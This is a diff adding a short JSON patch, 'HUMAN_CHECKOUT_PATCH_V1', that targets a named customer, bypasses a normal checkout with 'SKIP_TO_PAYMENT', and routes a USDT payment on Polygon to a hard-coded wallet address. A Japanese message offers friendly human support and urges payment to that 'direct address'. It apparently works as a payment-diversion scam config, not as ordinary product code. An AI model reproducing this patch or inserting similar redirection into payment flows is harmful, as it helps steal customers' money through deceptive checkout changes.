@@ -1,0 +1,15 @@
+{
+  "patch_id": "HUMAN_CHECKOUT_PATCH_V1",
+  "target_id": "CUSTOMER_001",
+  "mode": "HUMAN_ASSISTED_DIRECT_PAYMENT",
+  "human_contact": {
+    "enabled": true,
+    "support_message": "ご不明点は人間が親身にサポートします。準備ができ次第、以下のダイレクトアドレスへ決済をお進めください。"
+  },
+  "instant_checkout": {
+    "network": "Polygon",
+    "asset": "USDT",
+    "recipient_address": "0xF7A353FAF6E6BD4732b0f234C656DBfDE53B0e91",
+    "action": "SKIP_TO_PAYMENT"
+  }
+}
